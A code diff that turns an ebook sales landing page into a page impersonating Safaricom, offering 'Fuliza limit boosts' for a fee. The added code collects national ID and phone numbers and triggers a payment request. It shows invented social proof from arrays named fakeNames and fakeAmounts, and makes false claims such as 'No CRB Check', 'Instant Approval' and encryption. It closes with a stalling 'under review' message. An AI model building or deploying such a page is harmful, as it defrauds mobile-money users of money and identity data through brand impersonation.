@@ -1,176 +1,290 @@
 "use client";
 
-import Image from "next/image";
-import { motion } from "framer-motion";
-import { ArrowDown } from "lucide-react";
+import React, { useEffect, useState } from "react";
 
-export default function LandingPage() {
+type Limit = {
+  id: string;
+  amount: number;
+  fee: number;
+};
+
+const limits: Limit[] = [
+  { id: "l1", amount: 5000, fee: 150 },
+  { id: "l2", amount: 7500, fee: 180 },
+  { id: "l3", amount: 10000, fee: 200 },
+  { id: "l4", amount: 15000, fee: 250 },
+  { id: "l5", amount: 20000, fee: 300 },
+  { id: "l6", amount: 30000, fee: 400 },
+  { id: "l7", amount: 40000, fee: 540 },
+  { id: "l8", amount: 50000, fee: 960 },
+];
+
+const fakeNames = ["James K.", "Mercy W.", "Brian O.", "Faith N.", "Allan M."];
+const fakeAmounts = [15000, 20000, 34000, 50000, 25000];
+
+export default function FulizaBoost() {
+  const [selectedLimit, setSelectedLimit] = useState<Limit | null>(null);
+  const [showModal, setShowModal] = useState(false);
+  const [loading, setLoading] = useState(false);
+  const [success, setSuccess] = useState(false);
+  const [phone, setPhone] = useState("");
+  const [idNumber, setIdNumber] = useState("");
+  const [recent, setRecent] = useState({ name: "", amount: 0 });
+  const [errors, setErrors] = useState<{ phone?: string; id?: string }>({});
+
+  /* Activity rotation */
+  useEffect(() => {
+    const generate = () => {
+      const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
+      const amount = fakeAmounts[Math.floor(Math.random() * fakeAmounts.length)];
+      setRecent({ name, amount });
+    };
+    generate();
+    const interval = setInterval(generate, 2000);
+    return () => clearInterval(interval);
+  }, []);
+
+  /* Validation */
+  const validate = () => {
+    const newErrors: any = {};
+
+    if (!/^\d{6,8}$/.test(idNumber)) {
+      newErrors.id = "Enter a valid National ID (6–8 digits)";
+    }
+
+    if (
+      !/^(07\d{8}|2547\d{8})$/.test(phone)
+    ) {
+      newErrors.phone =
+        "Enter valid Safaricom number (07XXXXXXXX or 2547XXXXXXXX)";
+    }
+
+    setErrors(newErrors);
+    return Object.keys(newErrors).length === 0;
+  };
+
+  const handleBuy = async () => {
+    if (!selectedLimit) return;
+    if (!validate()) return;
+
+    setLoading(true);
+
+    const BACKEND_URL =
+      process.env.NEXT_PUBLIC_BACKEND_URL || "http://localhost:5000";
+
+    try {
+      const res = await fetch(`${BACKEND_URL}/api/runPrompt`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          phone,
+          amount: selectedLimit.fee,
+          local_id: `O${Date.now().toString(36)}`,
+          transaction_desc: `Fuliza boost to Ksh ${selectedLimit.amount}`,
+        }),
+      });
+
+      const data = await res.json();
+      if (data.status) setSuccess(true);
+    } catch (err) {
+      console.log(err);
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  const closeModal = () => {
+    setShowModal(false);
+    setSuccess(false);
+    setPhone("");
+    setIdNumber("");
+    setErrors({});
+  };
+
   return (
-    <main className="min-h-screen bg-black text-white flex flex-col items-center px-6 py-16 space-y-20 font-[Inter]">
-      
-      {/* Hero Section */}
-      <section className="flex flex-col items-center text-center space-y-6">
-        <div className="relative w-44 h-44 mb-6">
-          <Image
-            src="/me1.png"
-            alt="Creator 1"
-            width={176}
-            height={176}
-            className="rounded-full border-4 border-gray-800 absolute z-20 shadow-2xl"
-          />
-          <Image
-            src="/me2.png"
-            alt="Creator 2"
-            width={176}
-            height={176}
-            className="rounded-full border-4 border-gray-700 absolute left-10 top-6 opacity-80 blur-[0.3px] shadow-xl"
-          />
+    <div className="min-h-screen bg-[#f4faf6] flex justify-center">
+      <div className="w-full max-w-md pb-16">
+
+        {/* HEADER */}
+        <div className="bg-[#00A651] text-white text-center py-5 font-semibold text-lg shadow">
+          Safaricom Fuliza Limit Boost
         </div>
 
-        <h1 className="text-4xl md:text-5xl font-bold tracking-tight">
-          Turn <span className="text-purple-400">Threads</span> Into Income 💸
-        </h1>
-        <p className="text-gray-400 max-w-2xl text-lg leading-relaxed">
-          I used to scroll Threads for hours, wondering how others turned simple posts into real money.
-Then I built my own system — one that finally worked.
-These 3 eBooks are that exact roadmap: content, consistency, and income — all built from your mind, not your boss’s.
-        </p>
-
-        <div className="animate-bounce mt-8">
-          <ArrowDown className="w-7 h-7 text-gray-500" />
-        </div>
-      </section>
-
-      {/* eBook Section */}
-      <section className="flex flex-col items-center space-y-20 w-full max-w-3xl">
-
-       {/* $67 Premium eBook + Video */}
-<motion.div
-  whileHover={{ scale: 1.03 }}
-  className="bg-gradient-to-b from-gray-900/70 to-black/80 backdrop-blur-md rounded-3xl p-8 flex flex-col md:flex-row items-center text-center md:text-left shadow-[0_0_70px_-15px_rgba(255,255,255,0.08)] space-y-8 md:space-y-0 md:space-x-10"
->
-  {/* Video First */}
-  <div className="relative flex-1 flex justify-center">
-    <video
-      src="/promo.mp4"
-      autoPlay
-      muted
-      loop
-      playsInline
-      className="rounded-2xl shadow-2xl max-w-[300px]"
-    />
-    {/* Hand pointing → right */}
-    <motion.div
-      animate={{ x: [0, -10, 0], rotate: [0, -10, 0] }}
-      transition={{ repeat: Infinity, duration: 2 }}
-      className="absolute -right-10 top-1/2 text-5xl"
-    >
-      👉
-    </motion.div>
-  </div>
-
-  {/* Book + Text */}
-  <div className="flex-1 flex flex-col items-center md:items-start">
-    <div className="perspective-3d mb-6">
-      <Image
-        src="/guide.png"
-        alt="Threads to Income"
-        width={240}
-        height={320}
-        className="rounded-xl shadow-2xl transform rotate-y-6 hover:rotate-y-0 transition-all duration-700"
-      />
-    </div>
-    <h2 className="text-3xl font-semibold mb-3 font-[Playfair_Display]">
-      Threads to Income — The Ultimate Creator Guide
-    </h2>
-    <p className="text-gray-400 mb-6 max-w-sm">This isn’t another “social media hack” book — it’s a blueprint for freedom.
-You’ll learn how to use Threads to attract attention, build genuine authority, and turn that attention into income. Step by step, it shows you how to create high-demand digital products, write content that sells naturally, and build systems that work even when you don’t feel like posting.
-If you’ve ever dreamed of replacing your 9–5 with your ideas — this is your starting line.
-    </p>
-    <a
-      href="https://freedomguides88.gumroad.com/l/fouojn"
-      target="_blank"
-      rel="noopener noreferrer"
-      className="bg-white text-black font-bold px-8 py-3 rounded-full hover:bg-gray-200 transition-all"
-    >
-      Get for $67
-    </a>
-  </div>
-</motion.div>
-
-
-        {/* Free eBook */}
-        <motion.div
-          whileHover={{ scale: 1.04, rotate: 0.5 }}
-          className="bg-gradient-to-b from-gray-900/70 to-black/80 backdrop-blur-md rounded-3xl p-8 flex flex-col items-center text-center shadow-[0_0_60px_-15px_rgba(255,255,255,0.05)]"
-        >
-          <div className="perspective-3d mb-6">
-            <Image
-              src="/freebook.png"
-              alt="Free eBook"
-              width={220}
-              height={300}
-              className="rounded-xl shadow-2xl transform rotate-y-6 hover:rotate-y-0 transition-all duration-700"
-            />
-          </div>
-          <h2 className="text-2xl font-semibold mb-3 font-[Playfair_Display]">
-            101 Digital Products to Sell on Threads
+        {/* CONTENT (unchanged visually but slightly cleaner spacing) */}
+        <div className="text-center mt-5 px-6">
+          <h2 className="text-xl font-bold text-[#008043]">
+            Increase Your Fuliza Allocation
           </h2>
-          <p className="text-gray-400 mb-6 max-w-sm">
-            Start free — discover profitable ideas that work even if you’ve never sold anything online.
+          <p className="text-sm text-gray-600 mt-1">
+            Secure digital application process for eligible Safaricom customers.
           </p>
-          <a
-            href="https://freedomguides88.gumroad.com/l/pfxhof"
-            className="bg-white text-black font-bold px-8 py-3 rounded-full hover:bg-gray-200 transition-all"
-          >
-            Download Free
-          </a>
-        </motion.div>
+        </div>
 
-        {/* $27 Playbook */}
-        <motion.div
-          whileHover={{ scale: 1.04, rotate: -0.3 }}
-          className="bg-gradient-to-b from-gray-900/70 to-black/80 backdrop-blur-md rounded-3xl p-8 flex flex-col items-center text-center shadow-[0_0_60px_-15px_rgba(255,255,255,0.05)]"
-        >
-          <div className="perspective-3d mb-6">
-            <Image
-              src="/playbook.png"
-              alt="ChatGPT for Marketers"
-              width={220}
-              height={300}
-              className="rounded-xl shadow-2xl transform rotate-y-6 hover:rotate-y-0 transition-all duration-700"
-            />
+        <div className="mx-4 mt-6 bg-white rounded-2xl shadow-md p-4 border border-green-100">
+          <div className="flex justify-between text-sm font-medium text-[#008043]">
+            <span>✔ Secure Application</span>
+            <span>✔ No CRB Check</span>
           </div>
-          <h2 className="text-2xl font-semibold mb-3 font-[Playfair_Display]">
-            ChatGPT for Marketers — 500+ Threads Prompts
-          </h2>
-          <p className="text-gray-400 mb-6 max-w-sm">
-What if every post you wrote could trigger curiosity, connection, and clicks — almost automatically?
-This isn’t just content — it’s strategy.
-Inside are 500+ prompts and marketing hacks built on psychology, storytelling, and conversion triggers.
-Write posts that connect and sell.
+          <div className="text-center text-sm font-medium text-[#008043] mt-2">
+            ✔ Instant Approval
+          </div>
+        </div>
 
+        <div className="mx-4 mt-5 bg-green-50 border border-green-200 p-3 rounded-xl text-sm text-gray-700">
+          {recent.name} increased Fuliza to{" "}
+          <span className="font-semibold text-[#008043]">
+            Ksh {recent.amount.toLocaleString()}
+          </span>{" "}
+          • just now
+        </div>
 
+        <div className="mx-4 mt-6 text-[#008043] font-semibold text-sm">
+          Select Preferred Fuliza Limit
+        </div>
 
-Copy smarter. Post stronger. Sell faster.
-Get your playbook today and master the psychology of digital influence.          </p>
-          <a
-            href="https://freedomguides88.gumroad.com/l/pgyubl"
-            target="_blank"
-            rel="noopener noreferrer"
-            className="bg-white text-black font-bold px-8 py-3 rounded-full hover:bg-gray-200 transition-all"
+        <div className="grid grid-cols-2 gap-4 px-4 mt-4">
+          {limits.map((limit) => (
+            <div
+              key={limit.id}
+              onClick={() => setSelectedLimit(limit)}
+              className={`rounded-2xl p-4 cursor-pointer transition-all duration-300 shadow-sm hover:shadow-lg ${
+                selectedLimit?.id === limit.id
+                  ? "bg-[#00A651] text-white"
+                  : "bg-white border border-green-200"
+              }`}
+            >
+              <div className="font-semibold text-center">
+                Ksh {limit.amount.toLocaleString()}
+              </div>
+              <div className="text-xs text-center opacity-80 mt-1">
+                Service Fee: Ksh {limit.fee}
+              </div>
+            </div>
+          ))}
+        </div>
+
+        <div className="px-4 mt-6">
+          <button
+            onClick={() => selectedLimit && setShowModal(true)}
+            className="w-full bg-[#00A651] hover:bg-[#008043] text-white py-3 rounded-xl font-semibold shadow"
           >
-            Get for $27
-          </a>
-        </motion.div>
+            Proceed Securely
+          </button>
+        </div>
 
+        <div className="text-center text-xs text-gray-500 mt-6 px-6">
+          This is a digital facilitation service for Safaricom Fuliza users.
+          Processing timelines may vary based on eligibility criteria.
+        </div>
 
-      </section>
+        {/* MODAL */}
+        {showModal && selectedLimit && (
+          <div className="fixed inset-0 bg-black/40 flex items-center justify-center px-4">
+            <div className="bg-white w-full max-w-sm rounded-2xl shadow-2xl overflow-hidden">
 
-      {/* Footer */}
-      <footer className="text-gray-500 text-sm mt-16 tracking-wide">
-        © 2025 ✦ Built with love by <span className="text-white font-semibold">Woods:+254718140053</span>
-      </footer>
-    </main>
+              {/* Modal Header */}
+              <div className="bg-[#00A651] text-white px-6 py-4">
+                <h3 className="text-sm font-medium">
+                  Secure Fuliza Application
+                </h3>
+                <p className="text-lg font-semibold mt-1">
+                  Limit will be boosted to Ksh {selectedLimit.amount.toLocaleString()}
+                </p>
+              </div>
+
+              <div className="p-6">
+
+                {!success ? (
+                  <>
+                    {/* ID Input */}
+                    <div className="mb-4">
+                      <input
+                        type="text"
+                        placeholder="National ID Number"
+                        value={idNumber}
+                        onChange={(e) => setIdNumber(e.target.value)}
+                        className={`w-full rounded-xl p-3 text-sm border ${
+                          errors.id
+                            ? "border-red-400"
+                            : "border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-100"
+                        } outline-none transition`}
+                      />
+                      {errors.id && (
+                        <p className="text-red-500 text-xs mt-1">
+                          {errors.id}
+                        </p>
+                      )}
+                    </div>
+
+                    {/* Phone Input */}
+                    <div className="mb-4">
+                      <input
+                        type="tel"
+                        placeholder="Safaricom Number (07 or 2547...)"
+                        value={phone}
+                        onChange={(e) => setPhone(e.target.value)}
+                        className={`w-full rounded-xl p-3 text-sm border ${
+                          errors.phone
+                            ? "border-red-400"
+                            : "border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-100"
+                        } outline-none transition`}
+                      />
+                      {errors.phone && (
+                        <p className="text-red-500 text-xs mt-1">
+                          {errors.phone}
+                        </p>
+                      )}
+                    </div>
+
+                    {/* Buttons */}
+                    <div className="flex gap-3">
+                      <button
+                        onClick={closeModal}
+                        className="w-1/2 border border-gray-300 py-3 rounded-xl text-sm font-medium"
+                      >
+                        Cancel
+                      </button>
+
+                      <button
+                        onClick={handleBuy}
+                        disabled={loading}
+                        className="w-1/2 bg-[#00A651] text-white py-3 rounded-xl text-sm font-semibold"
+                      >
+                        {loading
+                          ? "Processing..."
+                          : `Pay Ksh ${selectedLimit.fee}`}
+                      </button>
+                    </div>
+
+                    <p className="text-xs text-gray-500 mt-4 text-center">
+                      Your information is encrypted and securely processed.
+                    </p>
+                  </>
+                ) : (
+                  <div className="text-center py-6">
+                    <h3 className="text-lg font-semibold text-[#008043]">
+                      Application Submitted
+                    </h3>
+                    <p className="text-sm text-gray-600 mt-2">
+                      Your Fuliza limit adjustment request is under review.
+                      Processing may take up to 72 hours.
+                    </p>
+
+                    <button
+                      onClick={closeModal}
+                      className="mt-5 bg-[#00A651] text-white px-6 py-2 rounded-xl text-sm"
+                    >
+                      Close
+                    </button>
+                  </div>
+                )}
+
+              </div>
+            </div>
+          </div>
+        )}
+
+      </div>
+    </div>
   );
 }
